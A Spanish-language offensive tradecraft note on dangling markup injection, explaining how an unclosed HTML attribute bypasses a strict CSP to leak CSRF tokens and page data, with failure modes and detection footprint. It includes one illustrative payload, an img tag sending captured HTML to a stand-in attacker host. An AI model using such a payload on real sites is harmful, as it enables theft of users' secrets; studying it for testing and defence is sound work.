---
tipo: tradecraft
clase: "[[CWE-79 - Cross-site Scripting]]"
eje: impacto
implementacion: "HTML injection sin ejecución de JS; exfil por un recurso que captura lo que sigue"
opsec: requiere-bypass
telemetria: ["[[Log de acceso del servidor web]]"]
requisitos: [inyeccion-de-html, sin-necesidad-de-JS]
coste: medio
alternativas: ["[[XSS - reflejado]]"]
probado: nunca
contexto: [chrome]
aliases:
  - dangling markup
  - dangling markup injection
tags:
  - dominio/web
---

# XSS - dangling markup injection

## Cuándo lo elijo

Cuando puedo inyectar HTML pero **no ejecutar JavaScript** — porque una CSP estricta bloquea el script, o el filtro corta lo necesario para XSS pero deja pasar tags. Es el plan B del XSS: si no puedo correr código, igual exfiltro datos de la página.

La señal: inyecto `<img>` o un atributo y sobrevive, pero cualquier handler/`<script>` lo bloquea la CSP. En vez de ejecución, busco robar lo que hay en el HTML.

## Por qué funciona

Se inyecta un tag con un atributo **sin cerrar** (un `src`/`href` con comilla abierta). El navegador consume todo el HTML que sigue —hasta la próxima comilla— como parte de esa URL, y lo manda al servidor del atacante al cargar el recurso. Todo lo que esté entre la inyección y la siguiente comilla (tokens CSRF, datos del usuario, otro secreto del DOM) viaja en la petición.

```
<img src='https://atacante.com/captura?html=
   ← desde acá el navegador traga el HTML siguiente hasta la próxima '
   incluido el <input name=csrf value=...> que estaba más abajo
```

## Cómo falla

- **CSP con `img-src`/`connect-src` estricto** — si no puede cargar de tu dominio, no exfiltra.
- **No hay una comilla suelta más adelante** que cierre la URL — a veces el HTML no coopera y captura de más o de menos.
- **El dato objetivo está antes de la inyección**, no después — dangling markup solo captura lo que sigue.
- Navegadores modernos mitigan algunas variantes (no cargan imágenes con newlines crudos en la URL).

## Coste

Medio. No da ejecución —así que no hay account takeover directo— pero roba secretos del DOM (tokens CSRF, datos de sesión) que habilitan el siguiente paso. Es la herramienta cuando la CSP te ganó el XSS pero no te cerró la inyección de HTML.

## Huella esperada

- El tag inyectado en el [[Log de acceso del servidor web]].
- Una petición a un recurso externo (`img`, `link`) con un bloque de HTML de la víctima en la query string — anomalía visible en egress.

Payloads en [[XSS dangling markup - matriz de referencia]].
